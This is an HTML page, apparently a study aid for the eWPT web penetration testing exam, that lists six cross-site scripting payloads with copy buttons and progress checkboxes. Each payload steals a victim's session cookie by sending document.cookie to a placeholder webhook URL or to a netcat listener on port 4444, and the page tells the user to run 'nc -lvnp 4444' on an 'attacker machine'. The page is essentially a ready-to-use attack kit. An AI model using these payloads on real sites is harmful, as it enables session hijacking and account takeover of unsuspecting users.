<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealers - eWPT</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #1a1a00; color: #e0e0e0; margin: 20px; }
        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ffd700; padding-bottom: 10px; }
        h2 { color: #ffd700; margin: 0; }
        table { width: 100%; border-collapse: collapse; background-color: #262600; margin-top: 20px; table-layout: fixed; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
        th { background-color: #333300; color: #ffd700; position: sticky; top: 0; }
        tr:hover { background-color: #3d3d00; }
        .payload-code { font-family: 'Courier New', monospace; color: #fff176; background: #1a1a00; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; white-space: pre-wrap; }
        button { background-color: #ffd700; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
        .reset-btn { background-color: #ff5555; color: white; }
        input[type="text"] { width: 95%; background: #333300; border: 1px solid #555; color: #fff; padding: 6px; }
        .checkbox-col { text-align: center; width: 50px; }
    </style>
</head>
<body>

    <div class="header-container">
        <h2>🍪 Cookie Stealing Payloads</h2>
        <button class="reset-btn" onclick="resetForm()">Clear All</button>
    </div>
    <p>Payloads are safely rendered. Use <b>nc -lvnp 4444</b> on your attacker machine to catch ID: 6.</p>

    <table id="payloadTable">
        <thead>
            <tr>
                <th style="width: 30px;">#</th>
                <th style="width: 50%;">Payload</th>
                <th style="width: 20%;">Description</th>
                <th style="width: 100px;">Action</th>
                <th class="checkbox-col">Done</th>
                <th>Notes</th>
            </tr>
        </thead>
        <tbody id="tableBody"></tbody>
    </table>

    <script>
        const payloads = [
            { id: 1, p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Webhook method (Image)" },
            { id: 2, p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Webhook method (Redirect)" },
            { id: 3, p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", d: "Webhook method (Fetch)" },
            { id: 4, p: "<img src=x onerror=\"this.src='https://YOUR-WEBHOOK-URL?c='+document.cookie\">", d: "Event Handler Bypass" },
            { id: 5, p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", d: "DOM Injection" },
            { id: 6, p: "<script>new Image().src='http://000.0.0.0:4444/cookie=' + encodeURI(document.cookie);<\/script>", d: "Netcat Listener (Internal)" }
        ];

        const tableBody = document.getElementById('tableBody');

        payloads.forEach(item => {
            const row = document.createElement('tr');
            
            const tdNum = document.createElement('td'); tdNum.textContent = item.id;
            
            const tdPayload = document.createElement('td');
            const codeSpan = document.createElement('span');
            codeSpan.className = 'payload-code';
            codeSpan.textContent = item.p; 
            tdPayload.appendChild(codeSpan);
            
            const tdDesc = document.createElement('td'); tdDesc.textContent = item.d;
            
            const tdAction = document.createElement('td');
            const btn = document.createElement('button');
            btn.textContent = 'Copy';
            btn.onclick = () => {
                navigator.clipboard.writeText(item.p);
                btn.textContent = 'Copied!';
                btn.style.backgroundColor = '#fff';
                setTimeout(() => { 
                    btn.textContent = 'Copy'; 
                    btn.style.backgroundColor = '#ffd700';
                }, 800);
            };
            tdAction.appendChild(btn);

            const tdCheck = document.createElement('td');
            tdCheck.className = 'checkbox-col';
            tdCheck.innerHTML = '<input type="checkbox" class="task-check">';

            const tdNote = document.createElement('td');
            tdNote.innerHTML = '<input type="text" class="task-note">';

            row.appendChild(tdNum);
            row.appendChild(tdPayload);
            row.appendChild(tdDesc);
            row.appendChild(tdAction);
            row.appendChild(tdCheck);
            row.appendChild(tdNote);

            tableBody.appendChild(row);
        });

        function resetForm() {
            if(confirm("Clear progress?")) {
                document.querySelectorAll('.task-check').forEach(cb => cb.checked = false);
                document.querySelectorAll('.task-note').forEach(nt => nt.value = '');
            }
        }
    </script>
</body>
</html>
